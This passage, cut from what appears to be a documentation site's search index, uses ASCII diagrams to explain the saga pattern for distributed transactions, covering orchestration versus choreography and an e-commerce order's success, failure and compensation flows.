\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                       \u2502\n\u2502                  \u2502   SAGA       \u2502                       \u2502\n\u2502                  \u2502 ORCHESTRATOR \u2502                       \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                       \u2502\n\u2502                         \u2502                               \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u2502\n\u2502         \u2502               \u2502               \u2502              \u2502\n\u2502         \u25bc               \u25bc               \u25bc              \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502    \u2502Service \u2502      \u2502Service \u2502      \u2502Service \u2502         \u2502\n\u2502    \u2502   A    \u2502      \u2502   B    \u2502      \u2502   C    \u2502         \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Flow:                                                   \u2502\n\u2502 1. Orchestrator \u2192 Service A: Execute T1                \u2502\n\u2502 2. Service A \u2192 Orchestrator: T1 Success                \u2502\n\u2502 3. Orchestrator \u2192 Service B: Execute T2                \u2502\n\u2502 4. Service B \u2192 Orchestrator: T2 Success                \u2502\n\u2502 5. Orchestrator \u2192 Service C: Execute T3                \u2502\n\u2502 6. Service C \u2192 Orchestrator: T3 Success                \u2502\n\u2502 7. Saga Complete                                        \u2502\n\u2502                                                         \u2502\n\u2502 Characteristics:                                        \u2502\n\u2502 \u2022 Centralized control                                   \u2502\n\u2502 \u2022 Orchestrator explicitly invokes services              \u2502\n\u2502 \u2022 Single point of control (easier to understand)        \u2502\n\u2502 \u2022 Tighter coupling                                      \u2502\n\u2502 \u2022 Orchestrator is single point of failure               \u2502\n\u2502 \u2022 Easier to implement complex logic                     \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Comparison: Choreography vs Orchestration</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    CHOREOGRAPHY vs ORCHESTRATION                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Aspect          \u2502 Choreography    \u2502 Orchestration      \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n\u2502 Control         \u2502 Decentralized   \u2502 Centralized        \u2502\n\u2502 Coupling        \u2502 Loose           \u2502 Tighter            \u2502\n\u2502 Complexity      \u2502 Higher          \u2502 Lower              \u2502\n\u2502 Debugging       \u2502 Difficult       \u2502 Easier             \u2502\n\u2502 Single Point    \u2502 None            \u2502 Orchestrator       \u2502\n\u2502 of Failure      \u2502                 \u2502                    \u2502\n\u2502 Scalability     \u2502 Better          \u2502 Orchestrator       \u2502\n\u2502                 \u2502                 \u2502 bottleneck         \u2502\n\u2502 Transaction     \u2502 Emergent        \u2502 Explicit           \u2502\n\u2502 Flow            \u2502                 \u2502                    \u2502\n\u2502 Best For        \u2502 Simple flows    \u2502 Complex business   \u2502\n\u2502                 \u2502 Event-driven    \u2502 logic              \u2502\n\u2502                 \u2502                 \u2502                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#72-saga-pattern-example-e-commerce-order","title":"7.2 Saga Pattern Example: E-Commerce Order","text":"<p>Scenario: Process an order involving payment, inventory, and shipping</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA EXAMPLE: E-COMMERCE ORDER                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Steps (Forward Transactions):                           \u2502\n\u2502 1. T1: Order Service - Create order                     \u2502\n\u2502 2. T2: Payment Service - Charge customer                \u2502\n\u2502 3. T3: Inventory Service - Reserve items                \u2502\n\u2502 4. T4: Shipping Service - Create shipment               \u2502\n\u2502                                                         \u2502\n\u2502 Compensations (Reverse Transactions):                   \u2502\n\u2502 1. C1: Order Service - Cancel order                     \u2502\n\u2502 2. C2: Payment Service - Refund customer                \u2502\n\u2502 3. C3: Inventory Service - Release items                \u2502\n\u2502 4. C4: Shipping Service - Cancel shipment               \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Success Scenario (All Steps Succeed):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA SUCCESS FLOW                               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Time  Order      Payment     Inventory    Shipping      \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n\u2502                                                         \u2502\n\u2502 t1    T1: Create                                        \u2502\n\u2502       Order #123                                        \u2502\n\u2502       Status: PENDING                                   \u2502\n\u2502       \u2705 Success                                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t2    \u2502          T2: Charge                             \u2502\n\u2502       \u2502          $100                                   \u2502\n\u2502       \u2502          Card: ****1234                         \u2502\n\u2502       \u2502          \u2705 Success                              \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 t3    \u2502          \u2502          T3: Reserve                 \u2502\n\u2502       \u2502          \u2502          Items: [A, B]               \u2502\n\u2502       \u2502          \u2502          Stock: 10\u21928                 \u2502\n\u2502       \u2502          \u2502          \u2705 Success                   \u2502\n\u2502       \u2502          \u2502          \u2502                           \u2502\n\u2502 t4    \u2502          \u2502          \u2502          T4: Create       \u2502\n\u2502       \u2502          \u2502          \u2502          Shipment #456    \u2502\n\u2502       \u2502          \u2502          \u2502          Address: 123 St  \u2502\n\u2502       \u2502          \u2502          \u2502          \u2705 Success        \u2502\n\u2502       \u2502          \u2502          \u2502          \u2502                \u2502\n\u2502 t5    Update                \u2502          \u2502                \u2502\n\u2502       Order #123            \u2502          \u2502                \u2502\n\u2502       Status: CONFIRMED     \u2502          \u2502                \u2502\n\u2502       \u2705                     \u2705          \u2705               \u2705\u2502\n\u2502                                                         \u2502\n\u2502 \u2705 RESULT: Order processed successfully                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Failure Scenario (Payment Fails - Compensation Triggered):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA FAILURE &amp; COMPENSATION FLOW                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Time  Order      Payment     Inventory    Shipping      \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n\u2502                                                         \u2502\n\u2502 \u2501\u2501\u2501\u2501\u2501\u2501 FORWARD EXECUTION \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501          \u2502\n\u2502                                                         \u2502\n\u2502 t1    T1: Create                                        \u2502\n\u2502       Order #123                                        \u2502\n\u2502       Status: PENDING                                   \u2502\n\u2502       \u2705 Success                                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t2    \u2502          T2: Charge                             \u2502\n\u2502       \u2502          $100                                   \u2502\n\u2502       \u2502          Card: ****1234                         \u2502\n\u2502       \u2502          \u274c FAILED!                             \u2502\n\u2502       \u2502          (Insufficient funds)                   \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2501\u2501\u2501\u2501\u2501\u2501 COMPENSATION (ROLLBACK) \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501          \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t3    \u2502          Trigger                                \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500Compensation                           \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t4    C1: Cancel                                        \u2502\n\u2502       Order #123                                        \u2502\n\u2502       Status: CANCELLED                                 \u2502\n\u2502       Reason: Payment failed                            \u2502\n\u2502       \u2705 Compensated                                     \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t5    Notify                                            \u2502\n\u2502       Customer                                          \u2502\n\u2502       \u2705 Done                                            \u2502\n\u2502                                                         \u2502\n\u2502 \u274c RESULT: Order cancelled (compensated)                \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Complex Failure Scenario (Inventory Fails After Payment):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA COMPLEX COMPENSATION                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Time  Order      Payment     Inventory    Shipping      \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n\u2502                                                         \u2502\n\u2502 \u2501\u2501\u2501\u2501\u2501\u2501 FORWARD EXECUTION \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501          \u2502\n\u2502                                                         \u2502\n\u2502 t1    T1: Create                                        \u2502\n\u2502       Order #123                                        \u2502\n\u2502       \u2705 Success                                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t2    \u2502          T2: Charge                             \u2502\n\u2502       \u2502          $100                                   \u2502\n\u2502       \u2502          \u2705 Success                              \u2502\n\u2502       \u2502          (Money deducted!)                      \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 t3    \u2502          \u2502          T3: Reserve                 \u2502\n\u2502       \u2502          \u2502          Items: [A, B]               \u2502\n\u2502       \u2502          \u2502          \u274c FAILED!                  \u2502\n\u2502       \u2502          \u2502          (Out of stock)              \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 \u2501\u2501\u2501\u2501\u2501\u2501 COMPENSATION (ROLLBACK) \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501          \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 t4    \u2502          \u2502          Trigger                     \u2502\n\u2502       \u2502          \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500Compensation                \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 t5    \u2502          C2: Refund                             \u2502\n\u2502       \u2502          $100                                   \u2502\n\u2502       \u2502          Card: ****1234                         \u2502\n\u2502       \u2502          \u2705 Refunded                             \u2502\n\u2502       \u2502          (Money returned)                       \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 t6    \u2502          Trigger                                \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500Compensation                           \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t7    C1: Cancel                                        \u2502\n\u2502       Order #123                                        \u2502\n\u2502       Status: CANCELLED                                 \u2502\n\u2502       Reason: Out of stock                              \u2502\n\u2502       \u2705 Compensated                                     \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t8    Notify                                            \u2502\n\u2502       Customer                                          \u2502\n\u2502       \u2705 Done                                            \u2502\n\u2502                                                         \u2502\n\u2502 \u274c RESULT: Order cancelled, payment refunded            \u2502\n\u2502    System returned to consistent state                  \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Saga State Machine:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA STATE MACHINE                              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502  START   \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                       \u2502 Execute T1                      \u2502\n\u2502                       \u25bc                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502             \u250c\u2500\u2500\u2500\u2192\u2502   T1     \u2502                           \u2502\n\u2502             \u2502    \u2502EXECUTING \u2502                           \u2502\n\u2502             \u2502    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502             \u2502         \u2502                                 \u2502\n\u2502             \u2502    \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502     T1 Fail \u2502    \u2502          \u2502 T1 Success                \u2502\n\u2502             \u2502    \u25bc          \u25bc                           \u2502\n\u2502             \u2502  \u250c\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                    \u2502\n\u2502             \u2514\u2500\u2500\u2502FAIL\u2502   \u2502   T2     \u2502\u2500\u2500\u2500\u2510                \u2502\n\u2502                \u2514\u2500\u2500\u252c\u2500\u2518   \u2502EXECUTING \u2502   \u2502 T2 Fail        \u2502\n\u2502                   \u2502     \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518   \u2502                \u2502\n\u2502                   \u2502          \u2502         \u2502                \u2502\n\u2502                   \u2502          \u2502 T2      \u2502                \u2502\n\u2502                   \u2502          \u2502 Success \u2502                \u2502\n\u2502                   \u2502          \u25bc         \u2502                \u2502\n\u2502                   \u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502                \u2502\n\u2502                   \u2502     \u2502   T3     \u2502\u25c4\u2500\u2500\u2518                \u2502\n\u2502                   \u2502     \u2502EXECUTING \u2502                    \u2502\n\u2502                   \u2502     \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                    \u2502\n\u2502                   \u2502          \u2502                          \u2502\n\u2502                   \u2502     \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2510                    \u2502\n\u2502                   \u2502     \u2502          \u2502 T3 Success         \u2502\n\u2502                   \u2502     \u25bc          \u25bc                    \u2502\n\u2502                   \u2502   \u250c\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502                   \u2502   \u2502C2  \u2502   \u2502 SUCCESS  \u2502            \u2502\n\u2502                   \u2502   \u2502EXEC\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                   \u2502   \u2514\u2500\u2500\u252c\u2500\u2518                            \u2502\n\u2502                   \u2502      \u2502                              \u2502\n\u2502                   \u2502      \u25bc                              \u2502\n\u2502                   \u2502   \u250c\u2500\u2500\u2500\u2500\u2510                            \u2502\n\u2502                   \u2502   \u2502C1  \u2502                            \u2502\n\u2502                   \u2502   \u2502EXEC\u2502                            \u2502\n\u2502                   \u2502   \u2514\u2500\u2500\u252c\u2500\u2518                            \u2502\n\u2502                   \u2502      \u2502                              \u2502\n\u2502                   \u25bc      \u25bc                              \u2502\n\u2502              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502              \u2502 COMPENSATED  \u2502                           \u2502\n\u2502              \u2502  (Failed)    \u2502                           \u2502\n\u2502              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#73-advantages-of-saga-pattern","title":"7.3 Advantages of Saga Pattern","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA PATTERN ADVANTAGES                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u2705 HIGH SCALABILITY                                  \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 No distributed locks               \u2502            \u2502\n\u2502    \u2502 \u2022 No blocking coordination           \u2502            \u2502\n\u2502    \u2502 \u2022 Services execute independently     \u2502            \u2502\n\u2502    \u2502 \u2022 Horizontal scaling possible        \u2502            \u2502\n\u2502    \u2502 \u2022 Handles millions of transactions   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2705 HIGH AVAILABILITY                                 \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 No synchronous blocking            \u2502            \u2502\n\u2502    \u2502 \u2022 Service failures isolated          \u2502            \u2502\n\u2502    \u2502 \u2022 Graceful degradation               \u2502            \u2502\n\u2502    \u2502 \u2022 Asynchronous processing            \u2502            \u2502\n\u2502    \u2502 \u2022 Better fault tolerance             \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u2705 LOOSE COUPLING (Choreography)                     \u2502\n\u2502    